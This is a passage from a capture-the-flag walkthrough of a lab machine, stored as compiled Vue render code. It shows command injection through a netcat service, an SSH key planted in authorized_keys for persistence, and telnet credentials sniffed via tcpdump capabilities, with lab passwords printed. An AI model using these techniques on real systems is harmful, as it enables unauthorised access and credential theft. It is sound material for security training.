/"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" / / _ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("/ __/ _ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'_ ` _ \\ / _ \\   | |/ _ \\  | |\\/| | | | | \\___ \\ / _ \\ '")]),t._v("__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" / / _ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" '__"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" V  V /  __/ "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  __/   "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  ___"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  __/ "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("   "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" V /  __/ "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("   \n   "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("_/"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("_/ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("___"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("___"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("___/"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("___"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("   "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("___/  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("__, "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("____/ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("___"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("_/ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("___"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("   \n                                                               "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("___/                                  \n\n\nUsername: petrio\nPass: h@ack3dP3tri0\nCommand: "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("curl")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.6")]),t._v(".87.171 "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 10.6.87.171 is my Ip")]),t._v("\n")])])]),a("p",[t._v("As soon as I send the curl request I got hit in my webserver.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.10")]),t._v(".32.20 - - "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("07/Feb/2022 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":49:52"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"GET / HTTP/1.1"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("200")]),t._v(" -\n")])])]),a("p",[t._v("Now that its confirment it runs bash, lets drop our sshkey in machine. For that I generate ssh key in my machine")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ ssh-keygen                                                                                           \n                                                                         "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" ⨯\nGenerating public/private rsa key pair.\nsEnter "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("file")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("in")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("which")]),t._v(" to save the key "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("/home/parallels/.ssh/id_rsa"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(": servsau\nEnter passphrase "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("empty "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" no passphrase"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(": \nEnter same passphrase again: \nYour identification has been saved "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("in")]),t._v(" servsau\nYour public key has been saved "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("in")]),t._v(" servsau.pub\nThe key fingerprint is:\nSHA256:A2FlA25ppu4XFSAs+qnX+6Vt+m4TDJrOIRwQFnOnV0g parallels@kali-linux-2021-3\nThe key's randomart image is:\n+---"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("RSA "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3072")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("----+\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("."),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(".ooE*"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("+        "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("o + "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),t._v(".+"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v("       "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" o o .B  "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(".")]),t._v("       "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(".")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(".")]),t._v(" ."),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v(".        "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" o o.o +S        "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(".+ "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(".")]),t._v(" o.       "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(".")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v(".       "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(".")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v("+ .++        "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(".")]),t._v("  o++*+.       "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("\n+----"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("SHA256"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("-----+\n\n")])])]),a("p",[t._v("It cretes two file "),a("code",[t._v("servsau")]),t._v(" and "),a("code",[t._v("servsau.pub")]),t._v("\nNow lets drop out public key in the remote machine.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("nc")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.10")]),t._v(".32.20 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("20011")]),t._v("\n__        __   _                            _____       __  __         ____                           \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("      / /__"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ___ ___  _ __ ___   ___  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_   _"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("__   "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("/  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_   _  / ___"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  ___ _ ____   _____ _ __ \n "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" /"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" / / _ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("/ __/ _ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'_ ` _ \\ / _ \\   | |/ _ \\  | |\\/| | | | | \\___ \\ / _ \\ '")]),t._v("__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" / / _ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" '__"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" V  V /  __/ "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  __/   "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  ___"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  __/ "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("   "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" V /  __/ "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("   \n   "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("_/"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("_/ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("___"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("___"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("___/"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("___"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("   "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("___/  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("__, "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("____/ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("___"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("_/ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("___"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("   \n                                                               "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("___/                                  \n\n\nUsername: petrio\nPass: h@ack3dP3tri0\nCommand: "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("bash")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("echo")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1zFwkxeeCj3w1p3E4SXhFYL4dwo92fpcuDAPXZQxLNfSRI7waXuuP3sA8OXwzA+jV79JT/8HVVti3rU1zoq147tKmT9OUAywt2Q4dSZt9PNdSkDb+7uRkbV4g1WNUOHNP/plK7zeCPBld/EHRQUKWhnm227sC+zj5cSK3CZVly/CfnOjyifEn+G9xRk5mX0XugqBfhz4lTDtI0m2WBmYycSwcUyab1LLVyOo0baJtAlClmDHR2peb2cpK9uHEDVQ5NJl7cP8HE94YiH5vMayfpjb29ilbmP5yvcGlx6uAMmP8aZqKDPngWuV6P6r75jZRsgabt29AjTqrETchzsC48oXu+1EPQB/1ABQ/nhfVm7MiZvTdLA5V/Prg1NB5k6ST6M1iLoKBGUkaAGMP7wel1ybovXcJ5ZTnuqVs+iPCgHSrH+6dokQk/gLmTlk1s92I3N6b+vXm46rvezFd56/+sG7xZcQSSPfIg7ZRLSAHqWKLWzqROxYj/w3q34lNqEs= parallels@kali-linux-2021-3"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /home/petrio/.ssh/authorized_keys\n\n")])])]),a("p",[t._v("Now that we have dropped out public key lets login to machine.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("ssh")]),t._v(" -i sservsau petrio@10.10.32.20    \n")])])]),a("p",[t._v("Now we got access as petrio on the machine")]),t._v(" "),a("h2",{attrs:{id:"horizontal-privilege-escalation"}},[t._v("Horizontal Privilege Escalation")]),t._v(" "),a("p",[t._v("Now that we got access as petrio in machine lets try privilege escalation.\nThe first thing I like to try as soon as I got shell is "),a("code",[t._v("sudo -l")])]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("sudo")]),t._v(" -l\nMatching Defaults entries "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" petrio on localhost:\n    env_reset, mail_badpass, "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("secure_path")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("/usr/local/sbin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(":/usr/local/bin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(":/usr/sbin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(":/usr/bin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(":/sbin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(":/bin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(":/snap/bin\n\nUser petrio may run the following commands on localhost:\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("ALL "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" ALL"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" NOPASSWD: /opt/request.sh\n\n")])])]),a("p",[t._v("We can run "),a("code",[t._v("/opt/request.sh")]),t._v(" with sudo without entering the password.\nLets see what that program do.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),t._v(" /opt/request.sh\ncat: /opt/request.sh: Permission denied\n\n")])])]),a("p",[t._v("Looks like we cant read the file content. Lets try to run this.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("sudo")]),t._v(" /opt/request.sh \nconnecting to telnet"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v("\ntrying to login'"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v("\npassed username\npassed password\nConnection closed by foreign host.\nExecuted"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v(".\n\n")])])]),a("p",[t._v("Looks like it is trying to connect to telnet and doing something.\nIf we cound just see those network traffic then we can see the username and password what it is using as telnet uses plain text authentication.")]),t._v(" "),a("p",[t._v("In linux there is a binary called "),a("code",[t._v("tcpdump")]),t._v(" which will do exactly the thing that we wanted but we need sudo permission to run and we cant run "),a("code",[t._v("tcpdump")]),t._v(" as sudo.")]),t._v(" "),a("p",[t._v("But lets check if it might be marked as "),a("code",[t._v("suid binary")])]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("ls")]),t._v(" -la "),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("`")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("which")]),t._v(" tcpdump"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("`")])]),t._v("\n-rwxr-x--- "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" petrio capcap "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1031784")]),t._v(" Jan "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v("  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2020")]),t._v(" /usr/sbin/tcpdump\n")])])]),a("p",[t._v("It was not market as suid either.")]),t._v(" "),a("p",[t._v("Let's check if there is any special "),a("a",{attrs:{href:"https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities",target:"_blank",rel:"noopener noreferrer"}},[t._v("capabilities"),a("OutboundLink")],1),t._v(" for tcpdump.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ getcap -r "),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("`")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("which")]),t._v(" tcpdump"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("`")])]),t._v("\n/usr/sbin/tcpdump "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" cap_net_admin,cap_net_raw+eip\n")])])]),a("p",[t._v("It has "),a("code",[t._v("cap_net_admin")]),t._v(" . So we can run it without root as well.")]),t._v(" "),a("p",[t._v("So lets run tcpdump in one screen and in another screen lets run the "),a("code",[t._v("/opt/request.sh")]),t._v(".")]),t._v(" "),a("p",[t._v("I like to analyisis network traffic using wireshark so I will save the output or tcpdump into out.pcap.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ tcpdump -i lo -w out.pcap\ntcpdump: listening on lo, link-type EN10MB "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Ethernet"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(", capture size "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("262144")]),t._v(" bytes\n\n")])])]),a("p",[t._v("Once we run the "),a("code",[t._v("request.sh")]),t._v(" , move that out.pcap to you machine and analysis using wireshark.")]),t._v(" "),a("p",[t._v("From that pcap file we got another credentials.\n"),a("code",[t._v("servsau:s33rVSS@U")])]),t._v(" "),a("h2",{attrs:{id:"vertical-privilege-escalation"}},[t._v("Vertical Privilege Escalation")]),t._v(" "),a("p",[t._v("Now that we got credentials for another user lets login as servsau.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("petrio@servsau:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("su")]),t._v(" servsau\nPassword: \nservsau@servsau:/home/petrio$ \n")])])]),a("p",[t._v("After logging in I started enumerating and when I was checking the local binaries installed by the user i.e in "),a("code",[t._v("/usr/local/bin")]),t._v(" I have found "),a("code",[t._v("doas")]),t._v(" binary.\nIf you dont know about "),a("a",{attrs:{href:"https://man.openbsd.org/doas",target:"_blank",rel:"noopener noreferrer"}},[t._v("doas"),a("OutboundLink")],1),t._v(" then it allows you to run files being other users (as mentiond in the config file)")]),t._v(" "),a("p",[t._v("Lets check the config of doas")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),t._v(" /usr/local/etc/doas.conf\npermit nopass setenv "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left 